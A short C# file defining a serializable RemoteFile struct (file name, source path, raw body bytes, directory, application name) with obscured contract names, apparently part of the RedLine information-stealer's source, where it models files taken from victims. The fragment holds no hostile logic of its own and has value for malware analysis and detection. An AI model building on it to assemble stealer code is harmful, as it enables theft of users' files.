using System.Runtime.Serialization;
using ProtoBuf;

namespace RedLine.SharedModels;

[DataContract(Name = "Entity5", Namespace = "Entity")]
[ProtoContract(Name = "RemoteFile")]
public struct RemoteFile
{
	[DataMember(Name = "Id1")]
	[ProtoMember(1, Name = "FileName")]
	public string FileName { get; set; }

	[ProtoMember(2, Name = "SourcePath")]
	[DataMember(Name = "Id2")]
	public string SourcePath { get; set; }

	[ProtoMember(3, Name = "Body")]
	[DataMember(Name = "Id3")]
	public byte[] Body { get; set; }

	[ProtoMember(4, Name = "FileDirectory")]
	[DataMember(Name = "Id4")]
	public string FileDirectory { get; set; }

	[DataMember(Name = "Id5")]
	[ProtoMember(5, Name = "NameOfApplication")]
	public string NameOfApplication { get; set; }
}
